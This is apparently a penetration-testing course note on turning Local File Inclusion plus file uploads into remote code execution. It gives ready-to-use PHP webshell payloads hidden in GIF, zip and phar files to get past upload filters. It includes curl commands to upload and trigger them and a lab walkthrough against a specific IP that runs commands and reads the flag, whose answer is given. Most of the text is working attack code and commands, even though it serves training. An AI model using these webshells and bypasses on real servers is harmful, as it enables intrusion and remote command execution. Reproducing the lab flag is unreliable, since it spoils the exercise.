# Section 7 — LFI + File Uploads = RCE

---

## The Attack Concept

You do not need the upload form to be vulnerable. You just need it to **accept files**. Embed PHP code inside any uploaded file — an image, zip, or archive metadata — then include that file via Local File Inclusion (LFI). The LFI sink executes the embedded code, giving you Remote Code Execution (RCE).

This works against strict upload filters (extension whitelists, MIME checks, magic bytes) and "safe" upload locations (where `.php` execution is blocked by the web server config). Inclusion happens through the LFI sink, not through a direct request to the uploaded file.

---

## Required Conditions

1. File upload feature accepts at least one file type
2. You know (or can guess/fuzz) the upload directory + filename
3. The LFI sink is `include`/`require`/`res.render`/etc. (executes — not just reads)

---

## Method 1 — Image with Embedded PHP (most reliable)

### Make the file
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
> Creates a file that starts with the GIF magic bytes (`GIF8`) to pass content-type checks. PHP ignores everything outside `<?php ... ?>` tags, so the magic bytes do not break execution. The `$_GET["cmd"]` parameter lets you run any OS command.

The `GIF8` prefix is the GIF magic byte signature — passes content-type sniffing. PHP scans the rest of the file for `<?php ... ?>` tags and ignores everything outside them, so the magic bytes don't break the PHP parser.

> Other formats: PNG = `\x89PNG\r\n\x1a\n` (8 bytes binary, harder to inline), JPEG = `\xff\xd8\xff\xe0` (binary). GIF is the cleanest because magic bytes are printable ASCII.

### Upload it
```bash
curl -sk -X POST "http://TARGET/upload.php" -F "uploadFile=@shell.gif"
```
> Uploads `shell.gif` as a multipart form POST. The `-F` flag sends a file upload. Replace `upload.php` and `uploadFile` with the actual endpoint and field name found in the app's source.

### Find the path
Inspect the page where uploads are referenced (`/settings.php`, `/profile`, etc.):
```bash
curl -sk "http://TARGET/settings.php" | grep -oP 'src=[\"\x27][^\"\x27]*'
# → src='/profile_images/shell.gif'
```

If hidden, fuzz common upload dirs:
```
/uploads/  /upload/  /files/  /images/  /profile_images/  /avatars/  /media/
```

### Trigger via LFI
```bash
curl -sk "http://TARGET/index.php?language=./profile_images/shell.gif&cmd=id"
# → uid=33(www-data)
```
> Includes the uploaded file via the LFI parameter. PHP executes the embedded shell code and runs the `id` command. Adjust the relative path if the app uses a directory prefix — try `../profile_images/shell.gif` if the direct path fails.

> The path needs to make sense relative to the LFI sink's working dir. If a prefix is added, traverse: `../profile_images/shell.gif`. If extension appended, the wrappers from Section 5 may help.

---

## Method 2 — Zip Wrapper

Requires `zip` PHP extension (compiled in by default but disabled on some hardened builds).

```bash
# 1. Build a zip containing a PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# 2. Upload (the .jpg extension may pass image whitelist; some servers detect via content-type — then upload as .zip)
curl -sk -X POST "http://TARGET/upload.php" -F "uploadFile=@shell.jpg"

# 3. Include via zip://
#    %23 = '#' (URL-encoded) — references the inner file inside the archive
curl -sk "http://TARGET/index.php?language=zip://./profile_images/shell.jpg%23shell&cmd=id"
```
> Packages a PHP shell inside a zip file renamed to `.jpg`. The `zip://` wrapper extracts and executes the inner `shell.php` file. `%23` is the URL-encoded `#` character that separates the archive path from the inner filename.

Use when Method 1 fails — for example, if the file is read but PHP-included content isn't being parsed properly because of file structure issues.

---

## Method 3 — Phar Wrapper

PHP archive format. Required: `phar.readonly = Off` to **create** phars (most hosts have it on by default, but you create yours locally then upload).

### Build the phar
```php
// shell.php (on your local machine)
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 shell.php
mv shell.phar shell.jpg    # disguise as image
```
> Builds the PHAR locally (`phar.readonly=0` is only needed on the build side) and renames it to `.jpg` so it passes an image upload filter — run this on your attack host, not the target.

### Upload + trigger
```bash
curl -sk -X POST "http://TARGET/upload.php" -F "uploadFile=@shell.jpg"
# %2F = '/' (URL-encoded) — references the inner file
curl -sk "http://TARGET/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id"
```

> Phar's killer feature: it ALSO triggers when an attacker-controlled string flows into `file_exists()`, `fopen()`, `is_file()` and similar — even if there's no `include`. That's the **Phar deserialization attack** (out of scope here, covered in Web Attacks module).

---

## Method Comparison

| Method | Setup complexity | Reliability | When to use |
|--------|------------------|-------------|-------------|
| Embedded PHP in image | Low | High | Default — try first |
| `zip://` wrapper | Low | Medium | When image method fails (rare) |
| `phar://` wrapper | Medium | Medium | Alternative + sets up phar deserialization potential |

---

## Lab — Image Upload → LFI → RCE

**Target:** `154.57.164.63:30844`

### Step 1 — Find upload form
```
/settings.php → form action="upload.php", field name="uploadFile", multipart/form-data
```

### Step 2 — Create + upload malicious GIF
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif

curl -sk -X POST "http://154.57.164.63:30844/upload.php" \
  -F "uploadFile=@/tmp/shell.gif"
# → "File successfully uploaded"
```

### Step 3 — Find uploaded path
```bash
curl -sk "http://154.57.164.63:30844/settings.php" | grep profile_images
# → src='/profile_images/shell.gif'
```

### Step 4 — Trigger via LFI
```bash
curl -sk "http://154.57.164.63:30844/index.php?language=./profile_images/shell.gif&cmd=id"
# → GIF8 uid=33(www-data) gid=33(www-data)
```

### Step 5 — Find + read flag at /
```bash
# ls / reveals a randomized flag filename
curl -sk -G "http://154.57.164.63:30844/index.php" \
  --data-urlencode "language=./profile_images/shell.gif" \
  --data-urlencode "cmd=ls /"
# → 2f40d853e2d4768d87da1c81772bae0a.txt

curl -sk -G "http://154.57.164.63:30844/index.php" \
  --data-urlencode "language=./profile_images/shell.gif" \
  --data-urlencode "cmd=cat /2f40d853e2d4768d87da1c81772bae0a.txt" \
  | grep -oE 'HTB\{[^}]+\}'
```

**Flag:** `HTB{upl04d+lf!+3x3cut3=rc3}`

---

## Exam Notes

- The upload form does **not** need to be vulnerable. It just needs to store a file you control.
- `GIF8` is the magic-byte cheat code for image-validation bypasses — printable ASCII, parseable as text, valid GIF header
- PHP parses ONLY content inside `<?php ... ?>` — bytes outside are silently ignored, so junk magic bytes don't break execution
- This attack BEATS `allow_url_include=Off` because everything happens with local files
- This attack BEATS upload-extension whitelists if the LFI sink itself ignores extensions
- Always check the upload path is web-accessible AND known — if blind, fuzz `/uploads/`, `/profile_images/`, `/files/`, `/avatar/`, `/users/IDX/avatar.gif`
- For phar: the build script must run with `phar.readonly=0`; only the BUILDING side needs this — uploading + including is unrestricted
